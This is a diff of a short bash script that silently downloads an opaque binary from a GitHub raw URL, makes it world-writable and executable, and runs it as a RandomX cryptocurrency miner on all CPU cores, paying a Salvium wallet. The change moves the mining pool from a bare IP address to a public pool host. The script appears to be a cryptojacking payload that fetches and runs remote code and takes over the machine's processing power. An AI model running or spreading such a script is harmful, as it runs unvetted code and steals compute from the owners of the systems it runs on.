@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O gigi https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
 chmod 777 gigi
-./gigi --donate-level 1 -o 165.227.239.240:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw.$(echo $(shuf -i 1-100000 -n 1)-MM) -p $(echo $(shuf -i 1-100000 -n 1)-MM) -a rx/0 -t $(nproc --all)
+./gigi --donate-level 1 -o us.salvium.herominers.com:1230 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw.$(echo $(shuf -i 1-100000 -n 1)-MM) -p $(echo $(shuf -i 1-100000 -n 1)-MM) -a rx/0 -t $(nproc --all)
